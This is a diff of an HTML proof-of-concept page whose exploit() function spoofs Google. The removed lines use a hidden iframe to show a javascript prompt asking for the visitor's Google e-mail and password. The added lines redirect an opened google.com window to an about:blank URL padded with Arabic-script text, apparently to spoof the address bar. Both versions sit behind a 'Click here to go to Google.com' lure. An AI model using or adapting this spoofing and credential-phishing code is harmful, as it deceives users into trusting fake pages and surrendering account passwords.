@@ -6,10 +6,8 @@
 
     function exploit() {
 
-      window.open("https://www.google.com");
-
-      document.getElementById("iframe").src = 'javascript:prompt("In order to access Google.com\\nyou must first login on your\\nGoogle Account.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
-    
+      var x = window.open("https://www.google.com");
+    setTimeout(function(){x.location='about:blank%23مثال.السعوديةمثال.السعوديةمثال.السعودية'}, 3000)
     }
     
     </script>
@@ -20,7 +18,6 @@
       <center><h1>Click here to go to Google.com</h1></center>
     </a>
 
-    <iframe styleframeborder="0" style="width:0;height:0;" id="iframe" src=""></iframe>
 
   </body>
 </html>
